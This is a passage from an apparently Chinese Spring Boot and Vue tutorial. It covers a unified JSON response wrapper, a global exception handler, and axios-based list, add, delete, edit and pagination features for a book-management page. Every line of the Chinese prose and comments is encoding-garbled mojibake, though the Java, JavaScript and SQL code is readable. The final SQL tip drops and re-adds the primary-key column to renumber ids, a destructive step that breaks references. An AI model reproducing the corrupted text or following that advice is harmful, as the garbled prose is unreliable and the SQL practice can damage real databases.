@Override\n    public boolean supports(MethodParameter methodParameter, Class<? extends HttpMessageConverter<?>> aClass) {\n        return true;\n    }\n\n    /**\n     * å¤„ç†è¿”å›ç»“æœ\n     */\n    @Override\n    public Object beforeBodyWrite(Object o, MethodParameter methodParameter, MediaType mediaType, Class<? extends HttpMessageConverter<?>> aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse) {\n        //å¤„ç†å­—ç¬¦ä¸²ç±»å‹æ•°æ®\n        if(o instanceof String){\n            try {\n                return objectMapper.writeValueAsString(Result.success(o));\n            } catch (JsonProcessingException e) {\n                e.printStackTrace();\n            }\n        }\n        //è¿”å›ç±»å‹æ˜¯å¦å·²ç»å°è£…\n        if(o instanceof Result){\n            return o;\n        }\n        return Result.success(o);\n    }\n}\n\n```\n\n**æ­¥éª¤â‘¡**ï¼šæµ‹è¯•ï¼Œæ— éœ€è½¬æ¢æ ¼å¼ï¼Œç›´æ¥ä½¿ç”¨\n\n```java\n@GetMapping(\"/getUserName\")\npublic static String getUserName(){\n  HashMap hashMap = new HashMap();\n  return hashMap.get(0).toString(); // æ¨¡æ‹Ÿä¸€ä¸ªç©ºæŒ‡é’ˆå¼‚å¸¸\n}\n```\n\nè¿”å›ç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›ç»“æœä¸åœ¨Resultä¸­å®šä¹‰çš„å‚æ•°ç±»å‹ç›¸åŒã€‚\n\n```powershell\n{\n    \"code\": 0,\n    \"message\": \"æˆåŠŸ\",\n    \"data\": {\n        \"timestamp\": \"2022-09-09T14:37:19.902+00:00\",\n        \"status\": 500,\n        \"error\": \"Internal Server Error\",\n        \"path\": \"/getUserName\"\n    }\n}\n```\n\n#### d.å…¨å±€å¼‚å¸¸å¤„ç†\n\n> é‡åˆ°å¼‚å¸¸æ—¶ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„åº”è¯¥æ˜¯tryâ€¦catchï¼Œä¸è¿‡è¿™ç§æ–¹å¼ä¼šå¯¼è‡´å¤§é‡ä»£ç é‡å¤ï¼Œç»´æŠ¤å›°éš¾ç­‰é—®é¢˜ï¼Œè¿™é‡Œä¸ç”¨æ‰‹å†™tryâ€¦catchï¼Œç”±å…¨å±€å¼‚å¸¸å¤„ç†å™¨ç»Ÿä¸€æ•è·ï¼›å¯¹äºè‡ªå®šä¹‰å¼‚å¸¸ï¼Œåªèƒ½é€šè¿‡å…¨å±€å¼‚å¸¸å¤„ç†å™¨æ¥å¤„ç†ï¼Œä½¿ç”¨å…¨å±€å¼‚å¸¸å¤„ç†å™¨æœ€å¤§çš„ä¾¿åˆ©å°±æ˜¯ç¨‹åºå‘˜åœ¨å†™ä»£ç æ—¶ä¸å†éœ€è¦æ‰‹å†™ tryâ€¦catchäº†ã€‚  \n\n**æ­¥éª¤â‘ **ï¼šé¦–å…ˆæ–°å¢ä¸€ä¸ªç±»ï¼Œå¢åŠ `@RestControllerAdvice`æ³¨è§£ï¼Œå¦‚æœæˆ‘ä»¬æœ‰æƒ³è¦æ‹¦æˆªçš„å¼‚å¸¸ç±»å‹ï¼Œå°±æ–°å¢ä¸€ä¸ªæ–¹æ³•ï¼Œä½¿ç”¨`@ExceptionHandler`æ³¨è§£ä¿®é¥°ï¼Œæ³¨è§£å‚æ•°ä¸ºç›®æ ‡å¼‚å¸¸ç±»å‹ã€‚\n\nä¾‹å¦‚ï¼šcontrollerä¸­æ¥å£å‘ç”ŸExceptionå¼‚å¸¸æ—¶ï¼Œå°±ä¼šè¿›å…¥åˆ°Execptionæ–¹æ³•ä¸­è¿›è¡Œæ•è·ï¼Œå°†æ‚ä¹±çš„å¼‚å¸¸ä¿¡æ¯ï¼Œè½¬æ¢æˆæŒ‡å®šæ ¼å¼åäº¤ç»™ResponseAdviceæ–¹æ³•è¿›è¡Œç»Ÿä¸€æ ¼å¼å°è£…å¹¶è¿”å›ç»™å‰ç«¯ã€‚\n\n```java\n@RestControllerAdvice\n@Slf4j\npublic class ExceptionAdvice {\n\n    @ExceptionHandler(Exception.class)\n    public Result Execption(Exception e) {\n        log.error(\"æœªçŸ¥å¼‚å¸¸ï¼\", e);\n        //e.printStackTrace();\n        return Result.fail(ResultMsgEnum.TEST_ERROR);\n    }\n    //è¿˜å¯å®šä¹‰å…¶å®ƒæ‹¦æˆªå¼‚å¸¸æ–¹æ³•\n    //ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šæµ‹è¯•ï¼Œå†æ¬¡è°ƒç”¨æ¥å£getUserNameæŸ¥çœ‹è¿”å›ç»“æœ\n\n```java\n@GetMapping(\"/getUserName\")\npublic static String getUserName(){\n    HashMap hashMap = new HashMap();\n    return hashMap.get(0).toString(); // æ¨¡æ‹Ÿä¸€ä¸ªç©ºæŒ‡é’ˆå¼‚å¸¸\n}\n```\n\nè¿”å›ç»“æœ\n\n```powershell\n{\n    \"code\": 400,\n    \"message\": \"å‘ç”Ÿé”™è¯¯å•¦!\",\n    \"data\": null\n}\n```\n\n#### e.å¿«é€Ÿä½¿ç”¨\n\n> å‰é¢å®ç°äº†æ¶ˆæ¯ä¸€è‡´æ€§ï¼Œä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ä½œå¦‚ä¸‹å°è£…ï¼Œåªéœ€å¼•ç”¨åˆ°é¡¹ç›®ä¸­å³å¯\n\n**æ­¥éª¤â‘ **ï¼šå®šä¹‰æ•°æ®è¿”å›æ ¼å¼\n\n```java\n@Data\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\npublic class Result<T> {\n    private int code;\n    private String message;\n    private T data;\n\n    /**\n     * æˆåŠŸ\n     */\n    public static <T> Result<T> success(T data) {\n        Result<T> result = new Result<T>();\n        result.setCode(ResultMsgEnum.SUCCESS.getCode());\n        result.setMessage(ResultMsgEnum.SUCCESS.getMessage());\n        result.setData(data);\n        return result;\n    }\n\n    /**\n     * å¤±è´¥\n     */\n    public static <T> Result<T> fail(ResultMsgEnum resultMsgEnum) {\n        Result<T> result = new Result<T>();\n        result.setCode(resultMsgEnum.getCode());\n        result.setMessage(resultMsgEnum.getMessage());\n        return result;\n    }\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šå®šä¹‰çŠ¶æ€ç \n\n```java\n@Getter\n@NoArgsConstructor\n@AllArgsConstructor\npublic enum ResultMsgEnum {\n    SUCCESS(0, \"æˆåŠŸ\"),\n    FAIL(-1, \"å¤±è´¥\"),\n    TEST_ERROR(400, \"å‘ç”Ÿé”™è¯¯å•¦!\");\n    private int code;\n    private String message;\n}\n```\n\n**æ­¥éª¤â‘¢ï¼š**ç»Ÿä¸€æ¥å£\n\n```java\n@RestControllerAdvice\npublic class ResponseAdvice implements ResponseBodyAdvice<Object> {\n    @Autowired\n    private ObjectMapper objectMapper;\n\n    /**\n     * æ˜¯å¦å¼€å¯åŠŸèƒ½ true:å¼€å¯\n     */\n    @Override\n    public boolean supports(MethodParameter methodParameter, Class<? extends HttpMessageConverter<?>> aClass) {\n        return true;\n    }\n\n    /**\n     * å¤„ç†è¿”å›ç»“æœ\n     */\n    @Override\n    public Object beforeBodyWrite(Object o, MethodParameter methodParameter, MediaType mediaType, Class<? extends HttpMessageConverter<?>> aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse) {\n        //å¤„ç†å­—ç¬¦ä¸²ç±»å‹æ•°æ®\n        if(o instanceof String){\n            try {\n                return objectMapper.writeValueAsString(Result.success(o));\n            } catch (JsonProcessingException e) {\n                e.printStackTrace();\n            }\n        }\n        //è¿”å›ç±»å‹æ˜¯å¦å·²ç»å°è£…\n        if(o instanceof Result){\n            return o;\n        }\n        return Result.success(o);\n    }\n}\n```\n\n**æ­¥éª¤â‘£**ï¼šå…¨å±€å¼‚å¸¸\n\n```java\n@RestControllerAdvice\n@Slf4j\npublic class ExceptionAdvice {\n\n    @ExceptionHandler(Exception.class)\n    public Result Execption(Exception e) {\n        log.error(\"æœªçŸ¥å¼‚å¸¸ï¼\", e);\n        //e.printStackTrace();\n        return Result.fail(ResultMsgEnum.TEST_ERROR);\n    }\n    //è¿˜å¯å®šä¹‰å…¶å®ƒå¼‚å¸¸æ–¹æ³•\n    //ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚\n}\n```\n\n**æ€»ç»“**\n\n1. è®¾è®¡ç»Ÿä¸€çš„è¿”å›å€¼ç»“æœç±»å‹ä¾¿äºå‰ç«¯å¼€å‘è¯»å–æ•°æ®\n\n2. è¿”å›å€¼ç»“æœç±»å‹å¯ä»¥æ ¹æ®éœ€æ±‚è‡ªè¡Œè®¾å®šï¼Œæ²¡æœ‰å›ºå®šæ ¼å¼\n\n3. è¿”å›å€¼ç»“æœæ¨¡å‹ç±»ç”¨äºåç«¯ä¸å‰ç«¯è¿›è¡Œæ•°æ®æ ¼å¼ç»Ÿä¸€ï¼Œä¹Ÿç§°ä¸ºå‰åç«¯æ•°æ®åè®®\n\n\n**å‚è€ƒ**\n\n- [SpringBootç»Ÿä¸€æ¥å£è¿”å›å’Œå…¨å±€å¼‚å¸¸å¤„ç†](https://blog.csdn.net/qq_47183158/article/details/123440041)\n\n- [ç»Ÿä¸€æ¥å£è¿”å›å’Œå…¨å±€å¼‚å¸¸å¤„ç† ](https://juejin.cn/post/7032609987083894814#heading-6)\n\n## 6.é¡µé¢åŠŸèƒ½å¼€å‘\n\n### â“ªå‰ç«¯é¡µé¢\n\nå‰ç«¯é¡µé¢ä¸‹è½½ï¼šhttps://jwt1399.lanzouv.com/ibQNG0bet3yh\n\nå°†é¡µé¢ä¿å­˜åˆ° resources/staticç›®å½•ä¸­ï¼Œå»ºè®®æ‰§è¡Œmavençš„cleanç”Ÿå‘½å‘¨æœŸï¼Œé¿å…ç¼“å­˜çš„é—®é¢˜å‡ºç°ã€‚\n\nå¦‚æœæˆåŠŸè®¿é—®ï¼šhttp://127.0.0.1/pages/books.htmlï¼Œå³è¡¨æ˜æ¥å…¥æˆåŠŸ\n\nåœ¨è¿›è¡Œå…·ä½“çš„åŠŸèƒ½å¼€å‘ä¹‹å‰ï¼Œå…ˆåšå‰åç«¯è”é€šæ€§çš„æµ‹è¯•ï¼Œé€šè¿‡é¡µé¢å‘é€å¼‚æ­¥æäº¤ï¼ˆaxiosï¼‰\n\n```js\n//åˆ—è¡¨\ngetAll() {\n\taxios.get(\"/books\").then((res)=>{\n\t\tconsole.log(res.data);\n\t});\n},\n```\n\n```js\n//é’©å­å‡½æ•°ï¼ŒVUEå¯¹è±¡åˆå§‹åŒ–å®Œæˆåè‡ªåŠ¨æ‰§è¡Œ\ncreated() {\n  this.getAll();\n},\n```\n\nåªè¦åå°ä»£ç èƒ½å¤Ÿæ­£å¸¸å·¥ä½œï¼Œå‰ç«¯èƒ½å¤Ÿåœ¨æ—¥å¿—ä¸­æ¥æ”¶åˆ°æ•°æ®ï¼Œå°±è¯æ˜å‰åç«¯æ˜¯é€šçš„ï¼Œå³å¯è¿›è¡Œä¸‹ä¸€æ­¥çš„åŠŸèƒ½å¼€å‘äº†\n\n**æ€»ç»“**\n\n1. å•ä½“é¡¹ç›®ä¸­é¡µé¢æ”¾ç½®åœ¨resources/staticç›®å½•ä¸‹\n2. createdé’©å­å‡½æ•°ç”¨äºåˆå§‹åŒ–é¡µé¢æ—¶å‘èµ·è°ƒç”¨\n3. é¡µé¢ä½¿ç”¨axioså‘é€å¼‚æ­¥è¯·æ±‚è·å–æ•°æ®åç¡®è®¤å‰åç«¯æ˜¯å¦è”é€š\n\n### â‘ åˆ—è¡¨åŠŸèƒ½\n\nåˆ—è¡¨åŠŸèƒ½ä¸»è¦æ“ä½œå°±æ˜¯åŠ è½½å®Œæ•°æ®ï¼Œå°†æ•°æ®å±•ç¤ºåˆ°é¡µé¢ä¸Šï¼Œæ­¤å¤„è¦åˆ©ç”¨VUEçš„æ•°æ®æ¨¡å‹ç»‘å®šï¼Œå‘é€è¯·æ±‚å¾—åˆ°æ•°æ®ï¼Œç„¶åé¡µé¢ä¸Šè¯»å–æŒ‡å®šæ•°æ®å³å¯\n\n**a.é¡µé¢æ•°æ®æ¨¡å‹å®šä¹‰**\n\n```js\ndata:{\n\tdataList: [],//å½“å‰é¡µè¦å±•ç¤ºçš„åˆ—è¡¨æ•°æ®\n\t...\n},\n```\n\n**b.å¼‚æ­¥è¯·æ±‚è·å–æ•°æ®**\n\n```js\n//åˆ—è¡¨\ngetAll() {\n    axios.get(\"/books\").then((res)=>{\n        this.dataList = res.data.data;\n    });\n},\n```\n\n**c.é’©å­å‡½æ•°è°ƒç”¨è¯·æ±‚**\n\n```js\n//é’©å­å‡½æ•°ï¼ŒVUEå¯¹è±¡åˆå§‹åŒ–å®Œæˆåè‡ªåŠ¨æ‰§è¡Œ\ncreated() {\n  this.getAll();\n},\n```\n\nè¿™æ ·åœ¨é¡µé¢åŠ è½½æ—¶å°±å¯ä»¥è·å–åˆ°æ•°æ®ï¼Œå¹¶ä¸”ç”±VUEå°†æ•°æ®å±•ç¤ºåˆ°é¡µé¢ä¸Šäº†\n\n### â‘¡æ·»åŠ åŠŸèƒ½\n\næ·»åŠ åŠŸèƒ½é¦–å…ˆè¦è¿›è¡Œæ•°æ®æ”¶é›†çª—å£å¼¹çª—çš„å±•ç¤ºï¼Œæ·»åŠ åéšè—å¼¹çª—å³å¯ã€‚å› ä¸ºè¿™ä¸ªå¼¹çª—ä¸€ç›´å­˜åœ¨ï¼Œå› æ­¤å½“é¡µé¢åŠ è½½æ—¶é¦–å…ˆè®¾ç½®è¿™ä¸ªå¼¹çª—ä¸ºä¸å¯æ˜¾ç¤ºçŠ¶æ€ï¼Œéœ€è¦å±•ç¤ºæ—¶åˆ‡æ¢çŠ¶æ€å³å¯\n\n**a.è¡¨å•çª—å£é»˜è®¤çŠ¶æ€**\n\n```js\ndata:{\n\tdialogFormVisible: false,//æ·»åŠ è¡¨å•æ˜¯å¦å¯è§\n\t...\n},\n```\n\n**b.åˆ‡æ¢ä¸ºæ˜¾ç¤ºçŠ¶æ€**\n\n```js\n//å¼¹å‡ºæ·»åŠ çª—å£\nhandleCreate() {\n\tthis.dialogFormVisible = true;\n},\n```\n\n**c.å®šä¹‰æ¸…ç†æ•°æ®æ“ä½œ**\n\nç”±äºæ¯æ¬¡æ·»åŠ æ•°æ®éƒ½æ˜¯ä½¿ç”¨åŒä¸€ä¸ªå¼¹çª—å½•å…¥æ•°æ®ï¼Œæ‰€ä»¥æ¯æ¬¡æ“ä½œçš„ç—•è¿¹å°†åœ¨ä¸‹ä¸€æ¬¡æ“ä½œæ—¶å±•ç¤ºå‡ºæ¥ï¼Œéœ€è¦åœ¨æ¯æ¬¡æ“ä½œä¹‹å‰æ¸…ç†æ‰ä¸Šæ¬¡æ“ä½œçš„ç—•è¿¹\n\n```js\n//é‡ç½®è¡¨å•\nresetForm() {\n    this.formData = {};\n},\n```\n\n**d.åˆ‡æ¢å¼¹çª—çŠ¶æ€æ—¶æ¸…ç†æ•°æ®**\n\n```js\n//å¼¹å‡ºæ·»åŠ çª—å£\nhandleCreate() {\n    this.dialogFormVisible = true;\n    this.resetForm();\n},\n```\n\n**e.æ·»åŠ æ“ä½œ**\n\n1. å°†è¦ä¿å­˜çš„æ•°æ®ä¼ é€’åˆ°åå°ï¼Œé€šè¿‡postè¯·æ±‚çš„ç¬¬äºŒä¸ªå‚æ•°ä¼ é€’jsonæ•°æ®åˆ°åå°\n2. æ ¹æ®è¿”å›çš„æ“ä½œç»“æœå†³å®šä¸‹ä¸€æ­¥æ“ä½œ\n   - å¦‚æœæ˜¯çŠ¶æ€ç æ˜¯æˆåŠŸå°±å…³é—­æ·»åŠ çª—å£ï¼Œæ˜¾ç¤ºæ·»åŠ æˆåŠŸçš„æ¶ˆæ¯\n   - åä¹‹ä¿ç•™æ·»åŠ çª—å£ï¼Œæ˜¾ç¤ºæ·»åŠ å¤±è´¥çš„æ¶ˆæ¯\n3. æ— è®ºæ·»åŠ æ˜¯å¦æˆåŠŸï¼Œé¡µé¢å‡è¿›è¡Œåˆ·æ–°ï¼ŒåŠ¨æ€åŠ è½½æ•°æ®ï¼ˆå¯¹getAllæ“ä½œå‘èµ·è°ƒç”¨ï¼‰\n\n```js\n//æ·»åŠ \nhandleAdd () {\n    //å‘é€å¼‚æ­¥è¯·æ±‚\n    axios.post(\"/books\",this.formData).then((res)=>{\n        //å¦‚æœæ“ä½œæˆåŠŸï¼Œå…³é—­å¼¹å±‚ï¼Œæ˜¾ç¤ºæ•°æ®\n        if(res.data.code == 0){\n            this.dialogFormVisible = false;\n            this.$message.success(\"æ·»åŠ æˆåŠŸ\");\n        }else {\n          \tthis.$message.error(\"æ·»åŠ å¤±è´¥\");\n        }\n    }).finally(()=>{\n        this.getAll();//é‡è½½æ•°æ®ï¼Œé¿å…æ·»åŠ åæ•°æ®ä¸æ˜¾ç¤º\n    });\n},\n```\n\n**f.å–æ¶ˆæ·»åŠ æ“ä½œ**\n\n```js\n//å–æ¶ˆ\ncancel(){\n    this.dialogFormVisible = false;\n    this.$message.info(\"æ“ä½œå–æ¶ˆ\");\n},\n```\n\n**æ€»ç»“**\n\n1. è¯·æ±‚æ–¹å¼ä½¿ç”¨POSTè°ƒç”¨åå°å¯¹åº”æ“ä½œ\n2. æ·»åŠ æ“ä½œç»“æŸååŠ¨æ€åˆ·æ–°é¡µé¢åŠ è½½æ•°æ®\n3. æ ¹æ®æ“ä½œç»“æœä¸åŒï¼Œæ˜¾ç¤ºå¯¹åº”çš„æç¤ºä¿¡æ¯\n4. å¼¹å‡ºæ·»åŠ è¡¨å•æ—¶æ¸…é™¤ä¸Šæ¬¡è¡¨å•æ•°æ®\n\n### â‘¢åˆ é™¤åŠŸèƒ½\n\næ¨¡ä»¿æ·»åŠ æ“ä½œåˆ¶ä½œåˆ é™¤åŠŸèƒ½ï¼Œå·®åˆ«ä¹‹å¤„åœ¨äºåˆ é™¤æ“ä½œä»…ä¼ é€’ä¸€ä¸ªå¾…åˆ é™¤çš„æ•°æ®idåˆ°åå°å³å¯\n\n**a.åˆ é™¤æ“ä½œ**\n\n```js\n// åˆ é™¤\nhandleDelete(row) {\n    axios.delete(\"/books/\"+row.id).then((res)=>{\n        if(res.data.flag){\n            this.$message.success(\"åˆ é™¤æˆåŠŸ\");\n        }else{\n            this.$message.error(\"åˆ é™¤å¤±è´¥\");\n        }\n    }).finally(()=>{\n        this.getAll();\n    });\n},\n```\n\n**b.åˆ é™¤æ“ä½œæç¤ºä¿¡æ¯**\n\n```js\n// åˆ é™¤\nhandleDelete(row) {\n    //1.å¼¹å‡ºæç¤ºæ¡†\n    this.$confirm(\"æ­¤æ“ä½œæ°¸ä¹…åˆ é™¤å½“å‰æ•°æ®ï¼Œæ˜¯å¦ç»§ç»­ï¼Ÿ\",\"æç¤º\",{type:'info'}).then(()=>{\n        //2.åˆ é™¤ä¸šåŠ¡\n        axios.delete(\"/books/\"+row.id).then((res)=>{\n          if(res.data.code == 0){\n            \tthis.$message.success(\"åˆ é™¤æˆåŠŸ\");\n          }else {\n            \tthis.$message.error(\"åˆ é™¤å¤±è´¥\");\n          }\n        }).finally(()=>{\n             this.getAll();\n        });\n    }).catch(()=>{\n        //3.å–æ¶ˆåˆ é™¤\n        this.$message.info(\"å–æ¶ˆåˆ é™¤æ“ä½œ\");\n    });\n}ï¼Œ\t\n```\n\n**æ€»ç»“**\n\n1. è¯·æ±‚æ–¹å¼ä½¿ç”¨Deleteè°ƒç”¨åå°å¯¹åº”æ“ä½œ\n2. åˆ é™¤æ“ä½œéœ€è¦ä¼ é€’å½“å‰è¡Œæ•°æ®å¯¹åº”çš„idå€¼åˆ°åå°\n3. åˆ é™¤æ“ä½œç»“æŸååŠ¨æ€åˆ·æ–°é¡µé¢åŠ è½½æ•°æ®\n4. æ ¹æ®æ“ä½œç»“æœä¸åŒï¼Œæ˜¾ç¤ºå¯¹åº”çš„æç¤ºä¿¡æ¯\n5. åˆ é™¤æ“ä½œå‰å¼¹å‡ºæç¤ºæ¡†é¿å…è¯¯æ“ä½œ\n\n### â‘£ä¿®æ”¹åŠŸèƒ½\n\nä¿®æ”¹åŠŸèƒ½å¯ä»¥è¯´æ˜¯åˆ—è¡¨åŠŸèƒ½ã€åˆ é™¤åŠŸèƒ½ä¸æ·»åŠ åŠŸèƒ½çš„åˆä½“ã€‚å‡ ä¸ªç›¸ä¼¼ç‚¹å¦‚ä¸‹ï¼š\n\n1. é¡µé¢ä¹Ÿéœ€è¦æœ‰ä¸€ä¸ªå¼¹çª—ç”¨æ¥åŠ è½½ä¿®æ”¹çš„æ•°æ®ï¼Œè¿™ä¸€ç‚¹ä¸æ·»åŠ ç›¸åŒï¼Œéƒ½æ˜¯è¦å¼¹çª—\n\n2. å¼¹å‡ºçª—å£ä¸­è¦åŠ è½½å¾…ä¿®æ”¹çš„æ•°æ®ï¼Œè€Œæ•°æ®éœ€è¦é€šè¿‡æŸ¥è¯¢å¾—åˆ°ï¼Œè¿™ä¸€ç‚¹ä¸æŸ¥è¯¢ç›¸åŒï¼Œéƒ½æ˜¯è¦æŸ¥æ•°æ®\n\n3. æŸ¥è¯¢æ“ä½œéœ€è¦å°†è¦ä¿®æ”¹çš„æ•°æ®idå‘é€åˆ°åå°ï¼Œè¿™ä¸€ç‚¹ä¸åˆ é™¤ç›¸åŒï¼Œéƒ½æ˜¯ä¼ é€’idåˆ°åå°\n\n4. æŸ¥è¯¢å¾—åˆ°æ•°æ®åéœ€è¦å±•ç¤ºåˆ°å¼¹çª—ä¸­ï¼Œè¿™ä¸€ç‚¹ä¸æŸ¥è¯¢ç›¸åŒï¼Œéƒ½æ˜¯è¦é€šè¿‡æ•°æ®æ¨¡å‹ç»‘å®šå±•ç¤ºæ•°æ®\n\n5. ä¿®æ”¹æ•°æ®æ—¶éœ€è¦å°†è¢«ä¿®æ”¹çš„æ•°æ®ä¼ é€’åˆ°åå°ï¼Œè¿™ä¸€ç‚¹ä¸æ·»åŠ ç›¸åŒï¼Œéƒ½æ˜¯è¦ä¼ é€’æ•°æ®\n\n\n**a.æŸ¥è¯¢å¹¶å±•ç¤ºæ•°æ®**\n\n```js\n//å¼¹å‡ºç¼–è¾‘çª—å£\nhandleUpdate(row) {\n    axios.get(\"/books/\"+row.id).then((res)=>{\n      if(res.data.code == 0){\n          //å±•ç¤ºå¼¹å±‚ï¼ŒåŠ è½½æ•°æ®\n          this.formData = res.data.data;\n          this.dialogFormVisibleEdit = true;\n      }else {\n        \tthis.$message.error(\"æ•°æ®åŒæ­¥å¤±è´¥\");\n      }\n    });\n},\n```\n\n**b.ä¿®æ”¹æ“ä½œ**\n\n```js\n//ä¿®æ”¹\nhandleEdit() {\n    axios.put(\"/books\",this.formData).then((res)=>{\n        //å¦‚æœæ“ä½œæˆåŠŸï¼Œå…³é—­å¼¹å±‚å¹¶åˆ·æ–°é¡µé¢\n      if(res.data.code == 0){\n          this.dialogFormVisibleEdit = false;\n          this.$message.success(\"ä¿®æ”¹æˆåŠŸ\");\n      }else {\n        \tthis.$message.error(\"ä¿®æ”¹å¤±è´¥\");\n      }\n    }).finally(()=>{\n       \t this.getAll();\n    });\n},\n```\n\n**c.å–æ¶ˆä¿®æ”¹æ“ä½œ**\n\n```js\n//å–æ¶ˆ\ncancel(){\n    this.dialogFormVisible = false;\n  \tthis.dialogFormVisibleEdit = false;\n \t  this.$message.info(\"æ“ä½œå–æ¶ˆ\");\n},\n```\n\n**æ€»ç»“**\n\n1. åŠ è½½è¦ä¿®æ”¹æ•°æ®é€šè¿‡ä¼ é€’å½“å‰è¡Œæ•°æ®å¯¹åº”çš„idå€¼åˆ°åå°æŸ¥è¯¢æ•°æ®\n2. åˆ©ç”¨å‰ç«¯åŒå‘æ•°æ®ç»‘å®šå°†æŸ¥è¯¢åˆ°çš„æ•°æ®è¿›è¡Œå›æ˜¾\n3. è¯·æ±‚æ–¹å¼ä½¿ç”¨PUTè°ƒç”¨åå°å¯¹åº”æ“ä½œ\n4. ä¿®æ”¹æ“ä½œç»“æŸååŠ¨æ€åˆ·æ–°é¡µé¢åŠ è½½æ•°æ®\n5. æ ¹æ®æ“ä½œç»“æœä¸åŒï¼Œæ˜¾ç¤ºå¯¹åº”çš„æç¤ºä¿¡æ¯\n\n### â‘¤åˆ†é¡µåŠŸèƒ½\n\nåˆ†é¡µåŠŸèƒ½çš„åˆ¶ä½œç”¨äºæ›¿æ¢å‰é¢çš„æŸ¥è¯¢å…¨éƒ¨ï¼Œ\n\n**a.ElementUIåˆ†é¡µç»„ä»¶**\n\n```html\n<!--åˆ†é¡µç»„ä»¶-->\n<div class=\"pagination-container\">\n    <el-pagination\n     class=\"pagiantion\"\n     @current-change=\"handleCurrentChange\"\n     @size-change=\"handleSizeChange\"\n     :current-page=\"pagination.currentPage\"\n     :page-size=\"pagination.pageSize\"\n     layout=\"total,sizes, prev, pager, next, jumper\"\n     :page-sizes=\"[5, 10, 15, 20]\"\n     :total=\"pagination.total\">\n    </el-pagination>\n</div>\n```\n\n**b.é…åˆåˆ†é¡µç»„ä»¶ï¼Œå°è£…åˆ†é¡µå¯¹åº”çš„æ•°æ®æ¨¡å‹**\n\n```js\ndata:{\n  //åˆ†é¡µç›¸å…³æ¨¡å‹æ•°æ®\n\tpagination: {\t\n\t\tcurrentPage: 1,\t//å½“å‰é¡µç \n\t\tpageSize:10,\t //æ¯é¡µæ˜¾ç¤ºçš„è®°å½•æ•°\n\t\ttotal:0,\t\t  //æ€»è®°å½•æ•°\n\t}\n},\n```\n\n**c.ä¿®æ”¹æŸ¥è¯¢å…¨éƒ¨åŠŸèƒ½ä¸ºåˆ†é¡µæŸ¥è¯¢ï¼Œé€šè¿‡è·¯å¾„å˜é‡ä¼ é€’é¡µç ä¿¡æ¯å‚æ•°**\n\n```js\ngetAll() {\n    axios.get(\"/books/\"+this.pagination.currentPage+\"/\"+this.pagination.pageSize)\n        .then((res)=>{\n            console.log(res.data.data);\n    \t});\n},\n\n```\n\n**d.é¡µé¢æ ¹æ®åˆ†é¡µæ“ä½œç»“æœè¯»å–å¯¹åº”æ•°æ®ï¼Œå¹¶è¿›è¡Œæ•°æ®æ¨¡å‹ç»‘å®š**\n\n```js\ngetAll() {\n    axios.get(\"/books/\"+this.pagination.currentPage+\"/\"+this.pagination.pageSize)\n      \t.then((res)=>{\n            //console.log(res.data.data);\n      \t\t\tthis.dataList = res.data.data.records;\n            this.pagination.currentPage = res.data.data.current;\n            this.pagination.pageSize = res.data.data.size;\n            this.pagination.total = res.data.data.total;      \n    \t})\n},\n```\n\n**f.å¯¹åˆ‡æ¢é¡µç æ“ä½œè®¾ç½®è°ƒç”¨å½“å‰åˆ†é¡µæ“ä½œ**\n\n```js\n//åˆ‡æ¢é¡µç \nhandleCurrentChange(currentPage) {\n    this.pagination.currentPage = currentPage;\n    this.getAll();\n},\n```\n\n**g.å¯¹åˆ‡æ¢æ¯é¡µæ˜¾ç¤ºæ¡æ•°æ“ä½œè®¾ç½®è°ƒç”¨å½“å‰è®°å½•æ•°æ“ä½œ**\n\n```js\n//åˆ‡æ¢æ¯é¡µæ¡æ•°\nhandleSizeChange(pageSize){\n    this.pagination.pageSize = pageSize;\n    this.getAll();\n}\n```\n\n**æ€»ç»“**\n\n1. ä½¿ç”¨elåˆ†é¡µç»„ä»¶\n2. å®šä¹‰åˆ†é¡µç»„ä»¶ç»‘å®šçš„æ•°æ®æ¨¡å‹\n3. å¼‚æ­¥è°ƒç”¨è·å–åˆ†é¡µæ•°æ®\n4. åˆ†é¡µæ•°æ®é¡µé¢å›æ˜¾\n\n### â‘¥åˆ é™¤åŠŸèƒ½ç»´æŠ¤\n\nç”±äºä½¿ç”¨äº†åˆ†é¡µåŠŸèƒ½ï¼Œå½“æœ€åä¸€é¡µåªæœ‰ä¸€æ¡æ•°æ®æ—¶ï¼Œåˆ é™¤æ“ä½œå°±ä¼šå‡ºç°BUGï¼Œæœ€åä¸€é¡µæ— æ•°æ®ä½†æ˜¯ç‹¬ç«‹å±•ç¤ºï¼Œå¯¹åˆ†é¡µæŸ¥è¯¢åŠŸèƒ½è¿›è¡Œåå°åŠŸèƒ½ç»´æŠ¤ï¼Œå¦‚æœå½“å‰é¡µç å€¼å¤§äºæœ€å¤§é¡µç å€¼ï¼Œé‡æ–°æ‰§è¡ŒæŸ¥è¯¢ã€‚å…¶å®è¿™ä¸ªé—®é¢˜è§£å†³æ–¹æ¡ˆå¾ˆå¤šï¼Œè¿™é‡Œç»™å‡ºæ¯”è¾ƒç®€å•çš„ä¸€ç§å¤„ç†æ–¹æ¡ˆ\n\n```java\n@GetMapping(\"{currentPage}/{pageSize}\")\npublic IPage<Book> getPage(@PathVariable int currentPage, @PathVariable int pageSize){\n    IPage<Book> page = bookService.getPage(currentPage, pageSize);\n    //å¦‚æœå½“å‰é¡µç å€¼å¤§äºäº†æ€»é¡µç å€¼ï¼Œé‚£ä¹ˆé‡æ–°æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼Œä½¿ç”¨æœ€å¤§é¡µç å€¼ä½œä¸ºå½“å‰é¡µç å€¼\n    if( currentPage > page.getPages()){\n      \tpage = bookService.getPage((int)page.getPages(), pageSize);\n    }\n    return page;\n}\n```\n\nåˆ é™¤ä¸€æ¡æ•°æ®ä¹‹åï¼Œä¸»é”®idä¸è¿ç»­çš„é—®é¢˜è§£å†³\n\n```sql\n#åˆ é™¤idåˆ—\nalter table tbl_book drop id; \n#æ–°å¢idåˆ—,è®¾ä¸ºä¸»é”®,å¹¶è‡ªå¢\nALTER TABLE tbl_book ADD id INT NOT NULL PRIMARY KEY AUTO_INCREMENT FIRST; \n```\n\n### 